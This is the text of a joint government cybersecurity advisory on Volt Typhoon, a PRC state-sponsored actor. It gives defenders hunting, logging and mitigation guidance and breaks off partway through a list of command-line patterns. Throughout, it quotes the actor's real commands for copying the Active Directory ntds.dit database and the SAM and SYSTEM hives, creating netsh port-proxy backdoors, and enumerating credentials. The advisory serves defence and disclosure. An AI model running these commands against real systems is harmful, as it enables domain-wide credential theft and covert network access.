{
  "markdown": " \n \n \n \n \n \n \n \nDisclaimer:  This document is marked TLP:CLEAR. Disclosure is not limited. Sources may use TLP:CLEAR when information carries minimal or n o foreseeable \nrisk of misuse, in accordance with applicable rules and procedures for public release. Subject to standard copyright  rules, TLP:CLEAR information may be \ndistributed without restriction. For more information on the Traffic Light Protocol, see cisa.gov/tlp/ . \n \nU/OO/ 156893 -23 | PP-23-1143 | JUN 2023 Ver.  1.1 Joint Cybersecurity Advisory  \nTLP:CLEAR  \n \nTLP:CLEAR  \n \n \n \nPeople's Republic of China State -Sponsored Cyber \nActor Living o ff the Land to Evade Detection  \nSummary  \nThe United States and international cybersecurity authorities are  issuing this joint \nCybersecurity Advisory (CSA) to highlight a recently discovered cluster of activity of \ninterest associated with a  Peoples Republic of China (PRC)  state -sponsored cyber  \nactor , also known as Volt Typhoon . Private sector partners  have identified that this \nactivity affect s networks  across U.S. critical infrastructure sectors , and the a uthoring \nagencies believe the actor could apply the same techniques against these and other \nsector s worldwide.   \nThis advisory from the United States National Security Agency (NSA), the U.S. \nCybersecurity and Infrastructure Security Agency (CISA), the U.S. Federal Bureau of \nInvestigation (FBI) , the Australian Signals Directorates Australian Cyber Security \nCentre (ACSC) , the Communication s Security Establishments Canadian Centre for \nCyber Security (CCCS) , the New Zealand National Cyber Security Centre (NCSC -NZ), \nand the United Kingdom National Cyber Security Centre (NCSC -UK) (hereafter referred \nto as the authoring agencies) provides an overview of hunting guidance and \nassociated best practices to detect this activity . \nOne of t he actors  primary  tactics, technique s, and procedure s (TTP s) is living  off the \nland, which uses built -in network administration tools to perform their objectives. This \nTTP allows the actor to evade detection by blending in with normal Windows system \nand network activities, avoid endpo int detection and response (EDR) products that \nwould alert on the introduction of third-party applications to the host, and limit the \namount of activity that is captured in default logging configurations. Some of the built -in \ntools this actor us es are: wmic , ntdsutil , netsh , and PowerShell . The advisory  \n\n \n \nU/OO/156893 -23 | PP-23-1143  | JUN 2023 Ver. 1.1  2 PRC State -Sponsored  Cyber Actor Living off the Land to Evade Detection  \nTLP:CLEAR  \n \nTLP:CLEAR  \n provides e xamples of the actors commands along with detection signatures to aid \nnetwork defenders in hunting for  this activity . Many of the behavior al indicators included \ncan also be legitimate system ad ministration commands that appear in benign activity. \nCare should be taken not to assume that findings  are malicious without further \ninvestigation or  other indications of compromise . \n  \n\n \n \nU/OO/156893 -23 | PP-23-1143  | JUN 2023 Ver. 1.1  3 PRC State -Sponsored  Cyber Actor Living off the Land to Evade Detection  \nTLP:CLEAR  \n \nTLP:CLEAR  \n Contents  \nPeople 's Republic of China State -Sponsored Cyber Actor Living off the Land to Evade \nDetection  ................................ ................................ ................................ .........................  1 \nSummary  ................................ ................................ ................................ .........................  1 \nTechnical Details  ................................ ................................ ................................ .............  4 \nBackground  ................................ ................................ ................................ .....................  4 \nArtifacts  ................................ ................................ ................................ ...........................  4 \nNetwork artifacts  ................................ ................................ ................................ ..........  4 \nHost artifacts  ................................ ................................ ................................ ................  5 \nWindows management instrumentation (WMI/WMIC)  ................................ ..............  5 \nNtds.dit Active Directory database  ................................ ................................ ...........  5 \nPortProxy  ................................ ................................ ................................ .................  8 \nPowerShell  ................................ ................................ ................................ .............  10 \nImpacket  ................................ ................................ ................................ ................  10 \nEnumeration of the environment  ................................ ................................ ............  11 \nAdditional credential theft  ................................ ................................ .......................  12 \nAdditional commands  ................................ ................................ .............................  12 \nMitigations  ................................ ................................ ................................ .....................  13 \nLogging recommendations  ................................ ................................ ........................  14 \nIndicators of compromise (IOCs) summary  ................................ ................................ ... 15 \nTTPs  ................................ ................................ ................................ ..........................  15 \nCommand execution  ................................ ................................ ................................ .. 16 \nCommand line patterns  ................................ ................................ ..............................  18 \nFile paths  ................................ ................................ ................................ ...................  18 \nFile names  ................................ ................................ ................................ .................  18 \nSHA-256 file hashe s ................................ ................................ ................................ .. 18 \nUser -agent  ................................ ................................ ................................ .................  19 \nYara rules  ................................ ................................ ................................ ..................  19 \nReferences  ................................ ................................ ................................ ....................  21 \nAcknowledgements  ................................ ................................ ................................ ....... 22 \nAppendix: MI TRE ATT&CK Techniques  ................................ ................................ ........  23 \n \n\n \n \nU/OO/156893 -23 | PP-23-1143  | JUN 2023 Ver. 1.1  4 PRC State -Sponsored  Cyber Actor Living off the Land to Evade Detection  \nTLP:CLEAR  \n \nTLP:CLEAR  \n Technical Details  \nThis advisory uses the MITRE ATT&CK for Enterprise framework, version 13. See the \nAppendix: MITRE ATT&CK Techniques  for all referenced tactics and techniques.  \nBackground  \nThe authoring agencies  are aware of recent Peoples Republic of China (PRC) state -\nsponsored cyber  activity  and ha ve identified  potential indicators associated with th ese \ntechniques . This advisory  will help net defenders hunt for this activity on their systems. \nIt provides many  network and host artifacts associated with the activity  occurring after \nthe network has been initially c ompromised , with a focus on command line s used by the \ncyber actor. An Indicators of compromise (IOCs) summary  is included at the end of this \nadvisory . For a downloadable copy of IOCs, see aa23 -144a.stix_.xml  (STIX, 35 kB).  \nEspecially for living off the land techniques, i t is possible that some command  lines \nmight appear on a system as the result of benign act ivity and would be false positive  \nindicator s of malicious activity . Defenders must evaluate matches to determine their \nsignificance, applying their knowledge of the system and baseline behavior.  \nAdditionally, if creating detection logic based on these comm ands, network defenders \nshould account for variability in command string arguments , as items such as ports \nused may differ across environments.  \nArtifacts  \nNetwork artifacts  \nThe actor has leveraged compromised s mall office/ home office (SOHO) network \ndevices as intermediate infrastructure to obscure their activity  by having  much of the \ncommand and control (C2) traffic  emanate from local ISPs in the geographic area of the \nvictim. Owners of SOHO devices should ensure that network management interfaces \nare not ex posed to the Internet to avoid them being re -purposed as redirectors by \nmalicious actors. If they must be exposed to the Internet, device owners and operators \nshould ensure they follow zero trust principles and maintain the highest level of \nauthentication and access controls possible.  \nThe actor has used Earthworm and a custom Fast Reverse Proxy (FRP) client with \nhardcoded C2 callbacks [T1090 ] to ports 8080, 8443, 8043, 8000, and 10443 with \n\n \n \nU/OO/156893 -23 | PP-23-1143  | JUN 2023 Ver. 1.1  5 PRC State -Sponsored  Cyber Actor Living off the Land to Evade Detection  \nTLP:CLEAR  \n \nTLP:CLEAR  \n various filenames including, but not limited to: cisco_up.exe, cl64.exe, vm3dservice.exe , \nwatchdogd.exe, Win.exe , WmiPreSV.exe, a nd WmiPrvSE.exe.  \nHost artifacts  \nWindows management i nstrumentation ( WMI/WMIC ) \nThe actor has execut ed the following command  to gather information about local drives  \n[T1082 ]: \ncmd.exe /C \"wmic path win32_logicaldisk get \ncaption,filesystem,freespace,size,volumename\"  \nThis command does not require administrativ e credentials to return results. The \ncommand uses a command prompt [T1059.003 ] to execute a Windows Management \nInstrumentation Command Line ( WMIC ) query , collecting information abo ut the storage \ndevices on the local host , including drive letter, file system (e.g. , new technology file \nsystem [NTFS]),  free space and drive size in bytes, and an optional volume name.  \nWindows Management Instrumentation (WMI) is a built -in Windows tool that allows a \nuser to access management information from hosts in an enterprise environment. The \ncommand line version of WMI is called WMIC.  \nBy default, WMI Tracing is not enabled, so the WMI commands being executed and the \nassociated user might not be ava ilable. Additional information on WMI events and \ntracing can be found in the References  section of the advisory .  \nNtds.dit  Active Directory database  \nThe actor may try to exfiltrate the ntds.dit file and the SYSTEM registry hi ve from \nWindows d omain controllers (DCs) out of the network to perform password cracking  \n[T1003.003 ]. (The ntds.dit file is the main Active Directory (AD) database file and , by \ndefault, is stored at %SystemRoot% \\NTDS\\ntds.dit . This file contains information \nabout users, groups, group memberships, and password hashes for all users in the \ndomain;  the SYSTEM registry hive contains the boot key that is used to encrypt \ninformation in the  ntds.dit file. ) Although the ntds.dit file is locked while in use by AD, a \ncopy can be made by creating a Volume Shadow Copy and extracting the ntds.dit file \nfrom the Shadow Copy. The SYSTEM registry hive may also be  obtained from the \nShadow Copy.  The fol lowing example commands show the actor creating a Shadow \nCopy and then extracting a copy of the ntds.dit file from it.  \n\n \n \nU/OO/156893 -23 | PP-23-1143  | JUN 2023 Ver. 1.1  6 PRC State -Sponsored  Cyber Actor Living off the Land to Evade Detection  \nTLP:CLEAR  \n \nTLP:CLEAR  \n cmd /c vssadmin create shadow /for=C: > \nC:\\Windows\\Temp\\<filename>.tmp  \ncmd /c copy \n\\\\?\\GLOBALROOT \\Device\\HarddiskVolumeShadowCopy3 \\Windows\\NTD\nS\\ntds.dit C: \\Windows\\Temp > C: \\Windows\\Temp\\<filename>.tmp  \nThe built -in Ntdsutil.exe tool performs all these actions using a single command. There \nare several ways to execute Ntdsutil.exe , including running from an elevated command \nprompt (cmd.exe), using WMI/WMIC, or PowerShell. Defenders should look for the \nexecution of Ntdsutil.exe commands using long, short, or a combination of the \nnotations. For example, the long notation command activate instance ntds ifm  \ncan also be executed using the short notation ac i ntds i . Table 1 provides the long \nand short forms of the arguments used in the sample Ntdsutil.exe command, along with \na brief description of the arguments.  \nTable 1 : Ntdsutil.exe command syntax  \nLong form  Short form  Description  \nactivate instance %  ac i %  Sets variable % as the active instance  for \nntdsutil to use   \nifm i Install f rom media (ifm). Creates \ninstallation media to be u sed with \nDCPromo so the server will not need to \ncopy data from another Domain \nController on the network  \n \nThe actor has execut ed WMIC commands [T1047 ] to create a copy of the ntds.dit  file \nand SYSTEM registry hive using ntdsutil.exe. Each of the following actor commands is \na standalone example; multiple examples are provided to show how syntax and file \npaths may differ per environment.  \nwmic process call create \"ntdsutil \\\"ac i ntds \\\" ifm \\\"create \nfull C:\\Windows\\Temp\\pro \nwmic process call create \"cmd.exe /c ntdsutil \\\"ac i ntds \\\" \nifm \\\"create full C: \\Windows\\Temp\\Pro\" \nwmic process call create \"cmd.exe /c mkdir \nC:\\Windows\\Temp\\tmp & ntdsutil \\\"ac i ntds \\\" ifm \\\"create \nfull C:\\Windows\\Temp\\tmp\\\" \n\"cmd.exe\" /c wmic process call create \"cmd.exe /c mkdir \nC:\\windows\\Temp\\McAfee_Logs & ntdsutil \\\"ac i ntds \\\" ifm \n\\\"create full C: \\Windows\\Temp\\McAfee_Logs \\\" \n\n \n \nU/OO/156893 -23 | PP-23-1143  | JUN 2023 Ver. 1.1  7 PRC State -Sponsored  Cyber Actor Living off the Land to Evade Detection  \nTLP:CLEAR  \n \nTLP:CLEAR  \n cmd.exe /Q /c wmic process call create \"cmd.exe /c mkdir \nC:\\Windows\\Temp\\tmp & ntdsutil \\\"ac i ntds \\\" ifm \\\"create \nfull C:\\Windows\\Temp\\tmp\\\"  1> \n\\\\127.0.0.1 \\ADMIN$\\<timestamp value> 2>&1  \nNote:  The <timestamp value> would be an epoch timestamp following the format \nlike __1684956600 .123456 . \nEach actor command above creates a copy of the ntds.d it database and the SYSTEM \nand SECURITY registry hives in the C:\\Windows\\Temp\\<folder>  directory,  where \n<folder>  is replaced with the path specified in the command (e.g., pro, tmp, or \nMcAfee_Logs). By default, the hidden ADMIN$ share is mapped to C:\\Windows\\, so \nthe last command will direct standard output and error messages from the command to \na file within the folder specified.  \nThe actor has also sav ed the files directly to the C:\\Windows\\Temp  and \nC:\\Users\\Public  directories, so the entirety of those dire ctory structures should be \nanalyzed. Ntdsutil.exe creates two subfolders in the directory specified in the command : \nan Active Directory folder that contains the ntds.dit and ntds.jfm files, and a registry \nfolder that contains the SYSTEM and SECURITY hives.  Defenders should look for this \nfolder structure across their network:  \n<path specified in command> \\Active Directory \\ntds.dit  \n<path specified in command> \\Active Directory \\ntds.jfm  \n<path specified in command> \\registry \\SECURITY  \n<path specified in command> \\registry\\SYSTEM \nWhen one of the example command s is executed, several successive log entries are \ncreated in the Application log , under the ESENT  Source. Associated events can be \nviewed in Windows Event Viewer by navigating to: Windows Logs | Application . To \nnarrow results to relevant events, select Filter Current Log from the Actions menu on \nthe right side of the screen. In the Event sources dropdown, check the box next to \nESENT, then limit the logs to ID numbers 216, 325, 326, and 327. Clicking the OK b ox \nwill apply the filters to the results.  \nSince ESENT logging is used extensively throughout Windows, defenders should focus \non events that reference ntds.dit. If such events are present, the events  details  should \ncontain the file path where the file copi es were created. Since these files can be \n\n \n \nU/OO/156893 -23 | PP-23-1143  | JUN 2023 Ver. 1.1  8 PRC State -Sponsored  Cyber Actor Living off the Land to Evade Detection  \nTLP:CLEAR  \n \nTLP:CLEAR  \n deleted , or enhanced logging may not be configured on hosts, the file path can greatly \naid in a hunt operation. Identifying the user associated with this activity is also a critical \nstep in a hunt operation as othe r actions by the compromised or actor -created user \naccount can be helpful to understand additional actor TTPs, as well as the breadth of \nthe actor's actions.  \nNote: If an actor can exfiltrate the ntds.dit and SYSTEM registry hive, the entire domain \nshould b e considered compromised, as the actor will generally be able to crack the \npassword hashes for domain user accounts, create their own accounts, and/or join \nunauthorized systems to the domain.  If this occurs, defenders should follow guidance \nfor removing ma licious actors from victim networks, such as CISA's Eviction Guidance \nfor Network Affected by the SolarWinds and Active Directory/M365 Compromise . \nIn addition to the above TTPs use d by the actor to copy  the ntds.dit file, the following \ntools could be used by an actor to obtain the same information : \n Secretsdump.py  \n Note: This script is a component of Impacket, which the actor has been \nknown to use  \n Invoke -NinjaCopy (PowerShell)  \n DSInternals (PowerShell)  \n FgDump  \n Metasploit  \nBest practices for securing ntds.dit include hardening Domain Controllers and \nmonitoring event logs for ntdsut il.exe and similar process creations. Additionally, any \nuse of administrator privileges should be audit ed and validated to confirm the legitimacy \nof executed commands.   \nPortProxy  \nThe actor has us ed the following commands to enable port forwarding [T1090 ] on the \nhost:  \n\"cmd.exe /c \"netsh interface portproxy add v4tov4 \nlistenaddress=0.0.0.0 listenport=9999 \nconnectaddress=<rfc1918 internal ip address> \nconnectport=8443 protocol=tcp\"\"  \n\n \n \nU/OO/156893 -23 | PP-23-1143  | JUN 2023 Ver. 1.1  9 PRC State -Sponsored  Cyber Actor Living off the Land to Evade Detection  \nTLP:CLEAR  \n \nTLP:CLEAR  \n \"cmd.exe /c netsh interface portproxy add v4tov4 \nlistenport=50100 listenaddress=0.0.0.0 connectport=1433 \nconnectaddress=<rfc1918 internal ip address>\"  \nwhere <rfc1918 internal ip address>  is replaced with an IPv4 address \ninternal to the network, omitting the < >s.  \nNetsh  is a built -in Windows command line scripting utility that can display or modify the \nnetwork settings of a host, including the Windows Firewall. The portproxy add command \nis used to create a host:port proxy that will forward incoming connections on the \nprovided listenaddress and listenport to the connectaddress and connectport. \nAdministrative privileges are required to execute the portproxy command. Each \nportproxy command above will create a registry key in the \nHKLM\\SYSTEM\\CurrentControlSet \\Services \\PortProxy\\v4tov4\\tcp\\ path. \nDefenders should look for the presences of keys in this path and investigate any \nanomalous entries.  \nNote: Using  port proxies is not common for legitimate system administration  since they \ncan constitute a backdoor into the network that bypasses firewall policies.  \nAdministrators should limit port proxy  usage  within environments and only enable them \nfor the period of time in which they are required . \nDefenders should also use unusual IP addresses and ports in the command  lines or \nregistry e ntries to identify other hosts that are potentially included in actor actions. All \nhosts on the network should be examined for new and unusual firewall and port \nforwarding rules, as well as IP addresses and ports specified by the actor. If network \ntraffic or logging is available, defenders should attempt to identify what traffic was \nforwarded though the port proxies to aid in the hunt operation. As previously mentioned, \nidentifying the associated user account that made the networking changes can also aid \nin the hunt operation.  \nFirewall rule additions and changes can be viewed in Windows Event Viewer by \nnavigating to: Applications and Service Logs | Microsoft | Windows | \nWindows Firewall With Advanced Security | Firewall . \nIn addition to host -level changes, de fenders should review perimeter firewall \nconfigurations for unauthorized changes and/or entries that may permit external \n\n \n \nU/OO/156893 -23 | PP-23-1143  | JUN 2023 Ver. 1.1  10 PRC State -Sponsored  Cyber Actor Living off the Land to Evade Detection  \nTLP:CLEAR  \n \nTLP:CLEAR  \n connections to internal hosts. The actor is known to target perimeter devices in their \noperations. Firewall logs should be reviewed for  any connections to systems on the \nports listed in any portproxy commands discovered.  \nPowerShell  \nThe actor has us ed the following PowerShell [T1059.001 ] command to identify \nsuccess ful logons to the host  [T1033 ]: \nGet-EventLog security -instanceid 4624  \nNote:  Event ID 4624 is logged when a user successfully logs on to a host and \ncontains useful information such as  the logon type (e.g., interactive or \nnetworking), associated user and computer account names, and the logon time. \nEvent ID 4624 entries can be viewed in Windows Event Viewer by navigating to:  \nWindows Logs | Security . PowerShell logs can be viewed in Event  Viewer: \nApplications and Service Logs | Windows PowerShell . \nThis command identifies  what user account they are currently leveraging to access the \nnetwork , identify other users logged on to the host, or identify how their actions are \nbeing logged. If the a ctor is using a password spray technique  [T1110.003 ], there may \nbe several failed logon (Event ID 4625) events for several different user accounts, \nfollowed by one or more successf ul logons (Event ID 4624) within a short period of time. \nThis period may vary by actor but can range from a few seconds to a few minutes.  \nIf the actor is using brute force password att empts  [T1110 ] against a single user \naccount , there may be several Event ID 4625 entries for th at account, followed by a \nsuccessful logon Event ID 4624. Defenders should also look for abnormal account \nactivity , such as logons outside of normal working hour s and impossible time -and-\ndistance logons (e.g., a user logging on from two geographically separated locations at \nthe same time).  \nImpacket  \nThe actor regularly employ s the use of I mpackets wmiexec, which redirects output to a \nfile within the victim hosts ADMIN$  share (C:\\Windows\\) containing an epoch \ntimestamp in its name. The following is an example of the  dir command being \nexecuted by wmiexec.py : \n\n \n \nU/OO/156893 -23 | PP-23-1143  | JUN 2023 Ver. 1.1  11 PRC State -Sponsored  Cyber Actor Living off the Land to Evade Detection  \nTLP:CLEAR  \n \nTLP:CLEAR  \n cmd.exe /Q /c dir 1>  \n\\\\127.0.0.1 \\ADMIN$\\__1684956600.123456  2>&1 \n \nNote: Discovery of an entry similar to t he example above in the Windows Event \nLog and/or a file with a name in a similar format may be evidence of malicious \nactivity and should be investigated further. In the event that only a filename is \ndiscovered, the epoch timestamp within the filename refle cts the time of \nexecution by default and can be used to help scope threat hunting activities.  \nEnumeration of the environment  \nThe following commands were used by the actor to enumerate the network topology  \n[T1016 ], the active directory structure [ T1069.002 ], and other information about the \ntarget environment [ T1069.001 ], [T1082 ]:  \narp -a \ncurl www.ip -api.com \ndnscmd . /enumrecords /zone {REDACTED}  \ndnscmd . /enumzones  \ndnscmd /enumrecords {REDACTED} . /additional  \nipconfig /all  \nldifde.exe -f c:\\windows\\temp\\<filename>.txt -p subtree  \nnet localgroup administrators  \nnet group /dom  \nnet group \"Domain Admins\" /dom  \nnetsh interface firewall show all  \nnetsh interface portproxy show a ll \nnetsh interface portproxy show v4tov4  \nnetsh firewall show all  \nnetsh portproxy show v4tov4  \nnetstat -ano \nreg query hklm \\software \\ \nsysteminfo  \ntasklist /v  \nwhoami \nwmic volume list brief  \nwmic service brief  \n\n \n \nU/OO/156893 -23 | PP-23-1143  | JUN 2023 Ver. 1.1  12 PRC State -Sponsored  Cyber Actor Living off the Land to Evade Detection  \nTLP:CLEAR  \n \nTLP:CLEAR  \n wmic product list brief  \nwmic baseboard list full  \nwevtutil qe security /rd:true /f:text \n/q:*[System[(EventID=4624) and \nTimeCreated[@SystemTime>= '{REDACTED} ']] and \nEventData[Data='{REDACTED}']]  \nAdditional c redential theft \nThe actor also used the following commands to identify additional opportunities for \nobtaining credentials in the environment  [T1555 ], [T1003 ]: \ndir C:\\Users\\{REDACTED} \\.ssh\\known_hosts  \ndir \nC:\\users\\{REDACTED} \\appdata\\roaming\\Mozilla\\firefox\\profile\ns \n mimikatz.exe  \nreg query hklm \\software \\OpenSSH \nreg query hklm \\software \\OpenSSH\\Agent \nreg query hklm \\software \\realvnc \nreg query hklm \\software \\realvnc\\vncserver  \nreg query hklm \\software \\realvnc\\Allusers \nreg query hklm \\software \\realvnc\\Allusers \\vncserver  \nreg query hkcu \\software \\{REDACTED} \\putty\\session \nreg save hklm \\sam ss.dat  \nreg save hklm \\system sy.dat  \nAdditional commands  \nThe actor executed t he following additional commands:  \n7z.exe a -p {REDACTED} c: \\windows\\temp\\{REDACTED}.7z  \nC:\\Windows\\system32 \\pcwrun.exe \nC:\\Users\\Administrator \\Desktop\\Win.exe \nC:\\Windows\\System32 \\cmdbak.exe /c ping -n 1 127.0.0.1 >  \nC:\\Windows\\temp\\putty.log  \nC:\\Windows\\Temp\\tmp.log \n\"cmd.exe\" /c dir \\\\127.0.0.1\\C$ /od \n\"cmd.exe\" /c ping a n 1 <IP address>  \n\"cmd.exe\" /c wmic /user:<username> /password:<password> \nprocess call create \"net stop \\\"<service name> \\\" > \nC:\\Windows\\Temp\\tmp.log\"  \n\n \n \nU/OO/156893 -23 | PP-23-1143  | JUN 2023 Ver. 1.1  13 PRC State -Sponsored  Cyber Actor Living off the Land to Evade Detection  \nTLP:CLEAR  \n \nTLP:CLEAR  \n cmd.exe /Q /c cd 1> \\\\127.0.0.1 \\ADMIN$\\__<timestamp value> \n2>&1 \nnet use \\\\127.0.0.1 \\IPC$ /y /d  \npowershell start -process -filepath \nc:\\windows\\temp\\<filename>.bat -windowstyle Hidden  \nrar.exe a {REDACTED} c: \\Windows\\temp\\{REDACTED}  \nD:\\{REDACTED }\\ \nwmic /node:{REDACTED} /user:{REDACTED} /password:{REDACTED} \ncmd /c whoami  \nxcopy C: \\windows\\temp\\hp d:\\{REDACTED}  \nMitigations  \nThe authoring agencies recommend organizations implement the mitigations below to \nimprove your organizations cybersecurity posture on the basis of the threat actors \nactivity. These mitigations align with the Cross -Sector Cybersecurity Performance Goals \n(CPGs) developed by CISA and the National Institute of Standards and Technology \n(NIST). The CPGs provide a minimum set of practices and protections that CISA and \nNIST recommend all organizations implement. CISA and N IST based the CPGs on \nexisting cybersecurity Frameworks and guidance to protect against the most common \nand impactful threats and TTPs. Visit CISAs Cross -Sector Cybersecurity Performance \nGoals  for more information on the CPGs, including additional recommended baseline \nprotections.  \n Defenders should harden domain controllers and monitor event logs [ 2.T] for \nntdsutil.exe and similar process creations. Additionally, any use of administrator \nprivileges should be audited and validated to confirm the legitimacy of executed \ncommands.  \n Administrators should limit port proxy usage within environments and only enable \nthem for the period of time in which they are required [ 2.X]. \n Defenders should investigate unusual IP addresses and ports in command lines , \nregistry entries , and firewall logs to identify other hosts that are potentially \ninvolved in actor actions.  \n\n \n \nU/OO/156893 -23 | PP-23-1143  | JUN 2023 Ver. 1.1  14 PRC State -Sponsored  Cyber Actor Living off the Land to Evade Detection  \nTLP:CLEAR  \n \nTLP:CLEAR  \n  In addition to host -level changes, defenders should review perimeter firewall \nconfigurations for unauthorized changes and/or entries that may permit external \nconnections to intern al hosts.  \n Defenders should also look for abnormal account activity, such as logons outside \nof normal working hours and impossible time -and-distance logons (e.g., a user \nlogging on from two geographically separated locations at the same time).  \n Defenders sho uld forward log files to a hardened centralized logging server, \npreferably on a segmented network [ 2.F]. \nLogging recommendations  \nTo be able to detect the act ivity described in this CSA, defenders should set the audit \npolicy for Windows security logs to include  audit process creation  and include \ncommand line in process creation events  in addition to accessing the logs. \nOtherwise, the default logging configu rations may not contain the necessary \ninformation.  \nEnabling these options will create Event ID 4688 entries in the Windows Security log to \nview command line processes. Given the cost and difficulty of logging and analyzing \nthis kind of activity, if an orga nization must limit the requirements, they should focus on \nenabling this kind of logging on systems  that are externally facing or perform \nauthentication or authorization , especially including domain controllers.  \nTo hunt for the malicious WMI and PowerShell  activity, defe nders should also log WMI \nand PowerShell events . By default, WMI Tracing and deep PowerShell logging are not \nenabled, but they  can be enabled by following the configuration instructions linked in the \nReferences  section.  \nThe actor take s measures to hide their tracks, such as clearing logs  [T1070.001 ]. To \nensure log integrity and availability, defenders should forward log files to a hardened \ncentralized logging server, preferably on a segmented network. Such an architecture \nmakes it harder for an actor to cover their tracks as evidence of their actions w ill be \ncaptured in multiple locations.  \nDefenders should also monitor logs for Event ID 1102, which is generated when the \naudit log is cleared. All Event ID 1102 entries should be investigated as logs are \n\n \n \nU/OO/156893 -23 | PP-23-1143  | JUN 2023 Ver. 1.1  15 PRC State -Sponsored  Cyber Actor Living off the Land to Evade Detection  \nTLP:CLEAR  \n \nTLP:CLEAR  \n generally not cleared and this is a known actor tac tic to cover their tracks. Even if an \nevent log is cleared on a host, if the logs are also stored on a logging server , the copy of \nthe log will be preserved.  \nThis activity is often linked to malicious exploitation of edge devices and network \nmanagement dev ices. Defenders should enable logging on their edge devices, to \ninclude system logs, to be able to identify potential exploitation and lateral movement. \nThey should also enable network -level logging , such as sysmon, webserver, \nmiddleware, and network devic e logs.  \nIndicators of compromise  (IOCs)  summary  \nTTPs  \n Exploiting vulnerabilities  [T1190 ] in widely used software including, but not limited \nto: \n CVE-2021 -40539 ManageEngine ADSelfServic e Plus.  \n https://www.cisa.gov/uscert/ncas/alerts/aa21 -259a . \n CVE-2021 -27860 FatPipe WARP, IPVPN, MPVPN.  \n https://www.ic3.gov/Med ia/News/2021/211117 -2.pdf . \n Using webshells for persistence and exfiltration [ T1505.003 ], with at least some \nof the webshells derived from the Awen  webshell.  \n Using  compromised Small -Office Home -Office (SOHO) devices (e.g. routers) to \nobfuscate the source of the activity  [T1090.002 ]. \n Most common types include ASUS, Cisco RV, Draytek Vigor, Fa tPipe \nIPVPN/MPVPN/WARP, Fortinet Fortigate, Netgear Prosafe, and Zyxel \nUSG  devices . \n Common CVEs for these devices and mitigation guidance can be found in \nthe joint Cybersecurity Advisory,  Top CVEs Act ively Exploited by \nPeoples Rep ublic of China State -Sponsored Cyber Actors . \n Using liv ing off the land  tools for discovery, lateral movement , and collection \nactivities, to include:  \n certutil \n dnscmd  \n ldifde  \n makecab  \n net user/group/use  \n netsh  \n nltest  \n\n \n \nU/OO/156893 -23 | PP-23-1143  | JUN 2023 Ver. 1.1  16 PRC State -Sponsored  Cyber Actor Living off the Land to Evade Detection  \nTLP:CLEAR  \n \nTLP:CLEAR  \n  ntdsutil  \n PowerShell  \n req query/save  \n systeminfo  \n tasklist  \n wevtutil  \n wmic  \n xcopy  \n Selective clearing of Windows Event Logs, system logs, and other technical \nartifacts to remove evidence of their intrusion  activity  [T1070]. \n Using  open source hacktools tools, such as:  \n Fast Reverse Proxy (frp)  \n Probably derived from the publicly -available fatedier  and \nEarthWorm  variants.  \n Impacket  \n To detect Impacket usage, see the joint  Cybersecurity Advisory: \n\"Impacket and Exfiltration Tool Used to Steal Sensitive Information \nfrom Defense Industrial Base Organization . \n Mimikatz.exe   \n Remote administration tools  \n Defenders should consult the joint Cybersecurity Advisory: \n\"Protecting Against Malicious Use of Remote Monitoring and \nManageme nt Software \". \nCommand execution  \nFile names and directory paths used in these commands are only meant to serve as \nexamples. Actual names and paths may differ depending on environment and activity, \nso defenders should account for variants when performing que ries.  \nNote: Many of the commands are derivatives of common system administration \ncommands that could generate false positives when used alone without additional \nindicators.  \n7z.exe a -p {REDACTED} c: \\windows\\temp\\{REDACTED}.7z \nc:\\windows\\temp\\* \n\"C:\\pstools\\psexec.exe\" \\\\{REDACTED} -s cmd /c \"cmd.exe /c \n\"netsh interface portproxy delete v4tov4 \nlistenaddress=0.0.0.0 listenport=9999\"\"  \nC:\\Windows\\system32 \\pcwrun.exe \nC:\\Users\\Administrator \\Desktop\\Win.exe \n\n \n \nU/OO/156893 -23 | PP-23-1143  | JUN 2023 Ver. 1.1  17 PRC State -Sponsored  Cyber Actor Living off the Land to Evade Detection  \nTLP:CLEAR  \n \nTLP:CLEAR  \n cmd.exe /C dir /S \\\\{REDACTED} \\c$\\Users\\{REDACTED} >> \nc:\\windows\\temp\\{REDACTED}.tmp  \n\"cmd.exe\" /c wmic process call create \"cmd.exe /c mkdir \nC:\\windows\\Temp\\McAfee_Logs & ntdsutil \\\"ac i ntds \\\" ifm \n\\\"create full C: \\Windows\\Temp\\McAfee_Logs \\\" \ncmd.exe /Q /c cd 1> \\\\127.0.0.1 \\ADMIN$\\__<timestamp value>  \n2>&1 \ncmd.exe /Q /c net group \"domain admins\"  /dom \n1>\\\\127.0.0.1 \\ADMIN$\\__<timestamp value> 2>&1  \ncmd.exe /Q /c wmic process call create \"cmd.exe /c mkdir \nC:\\Windows\\Temp\\tmp & ntdsutil \\\"ac i ntds \\\" ifm \\\"create \nfull C:\\Windows\\Temp\\tmp\\\"  1> \n\\\\127.0.0.1 \\ADMIN$\\<timestamp value>  2>&1  \nD:\\{REDACTED} \\xcopy C: \\windows\\temp\\hp d:\\{REDACTED}  \nGet-EventLog security -instanceid 4624  \nldifde.exe -f c:\\windows\\temp\\cisco_up.txt -p subtree  \nmakecab ..\\backup\\210829-020000.zip \n..\\webapps\\adssp\\html\\Lock.lic  \nmove \"\\\\<redacted> \\c$\\users\\public\\Appfile\\registry \\SYSTEM\" \n..\\backup\\210829-020000.zip  \nnetsh interface portproxy add v4tov4 listenaddress=0.0.0.0 \nlistenport=9999 connectaddress={REDACTED} connect port=8443 \nprotocol=tcp  \nnetsh interface portproxy delete v4tov4 \nlistenaddress=0.0.0.0 listenport=9999  \nRar.exe a {REDACTED} c: \\Windows\\temp\\DMBC2C61.tmp  \nstart-process -filepath c: \\windows\\temp\\<filename> .bat -\nwindowstyle hidden 1  \nNote: The batch file in que stion ( <filename> .bat ) could use any name, and no \ndiscernable pattern has been determined at this time.  \nwmic process call create \"cmd.exe /c mkdir \nC:\\users\\public\\Appfile & ntdsutil \\\"ac i ntds \\\" ifm \n\\\"create full C: \\users\\public\\Appfile\\\" q q \n\n \n \nU/OO/156893 -23 | PP-23-1143  | JUN 2023 Ver. 1.1  18 PRC State -Sponsored  Cyber Actor Living off the Land to Evade Detection  \nTLP:CLEAR  \n \nTLP:CLEAR  \n wmic process  call create \"cmd.exe /c mkdir \nC:\\Windows\\Temp\\tmp & ntdsutil \\\"ac i ntds \\\" ifm \\\"create \nfull C:\\Windows\\Temp\\tmp\\\" \nwmic process call create \"cmd.exe /c ntdsutil \\\"ac i ntds \\\" \nifm \\\"create full C: \\Windows\\Temp\\Pro\" \nwmic process call create \"ntdsutil \\\"ac i ntds\\\" ifm \n\\\"create full C: \\Windows\\Temp\\\" \nCommand line patterns  \nCertain patterns in commands (with asterisks for wildcards) can be used to identify \npotentially malicious commands:  \n cmd.exe /C 